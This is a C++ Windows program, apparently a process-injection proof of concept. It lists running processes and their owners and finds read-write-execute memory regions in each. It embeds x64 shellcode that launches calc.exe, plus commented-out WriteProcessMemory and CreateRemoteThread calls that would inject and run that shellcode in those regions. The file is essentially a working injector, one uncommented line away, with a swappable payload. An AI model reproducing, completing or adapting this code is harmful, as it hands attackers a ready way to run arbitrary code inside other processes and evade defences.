#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>
#include <sddl.h>
#include <vector>

std::wstring GetProcessUser(HANDLE hProcess)
{
	HANDLE hToken = NULL;
	if (!OpenProcessToken(hProcess, TOKEN_QUERY, &hToken)) {
		std::wcerr << "Failed to open process token.\n";
		return L"Unknown User";
	}

	DWORD dwSize = 0;
	// First call gets the size needed for the buffer
	GetTokenInformation(hToken, TokenUser, NULL, 0, &dwSize);
	std::vector<BYTE> buffer(dwSize);
	PTOKEN_USER pTokenUser = reinterpret_cast<PTOKEN_USER>(buffer.data());

	if (!GetTokenInformation(hToken, TokenUser, pTokenUser, dwSize, &dwSize)) {
		std::wcerr << "Failed to get token information.\n";
		CloseHandle(hToken);
		return L"Unknown User";
	}

	WCHAR* szSid = NULL;
	if (!ConvertSidToStringSid(pTokenUser->User.Sid, &szSid)) {
		std::wcerr << "Failed to convert SID to string.\n";
		CloseHandle(hToken);
		return L"Unknown User";
	}

	std::wstring userSid(szSid);
	LocalFree(szSid);
	CloseHandle(hToken);

	return userSid;
}

int main()
{
	MEMORY_BASIC_INFORMATION mbi = {};
	LPVOID offset = 0;
	HANDLE process = NULL;
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 processEntry = {};
	processEntry.dwSize = sizeof(PROCESSENTRY32);
	DWORD bytesWritten = 0;
	unsigned char shellcode2[] = "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
									"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
									"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
									"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
									"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
									"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
									"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
									"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
									"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
									"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
									"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
									"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
									"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
									"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
									"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"
									"\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff"
									"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
									"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x6d\x64"
									"\x2e\x65\x78\x65\x20\x2f\x63\x20\x63\x61\x6c\x63\x2e\x65\x78"
									"\x65\x00";
	Process32First(snapshot, &processEntry);
	while (Process32Next(snapshot, &processEntry))
	{
		process = OpenProcess(MAXIMUM_ALLOWED, false, processEntry.th32ProcessID);
		if (process)
		{
			std::wcout << processEntry.szExeFile << " - " << GetProcessUser(process) << "\n";
			while (VirtualQueryEx(process, offset, &mbi, sizeof(mbi)))
			{
				offset = (LPVOID)((DWORD_PTR)mbi.BaseAddress + mbi.RegionSize);
				if (mbi.AllocationProtect == PAGE_EXECUTE_READWRITE && mbi.State == MEM_COMMIT && mbi.Type == MEM_PRIVATE)
				{
					std::cout << "\tRWX: 0x" << std::hex << mbi.BaseAddress << "\n";
					//WriteProcessMemory(process, mbi.BaseAddress, shellcode2, sizeof(shellcode2), NULL);
					//CreateRemoteThread(process, NULL, NULL, (LPTHREAD_START_ROUTINE)mbi.BaseAddress, NULL, NULL, NULL);
				}
			}
			offset = 0;
		}
		CloseHandle(process);
	}

	return 0;
}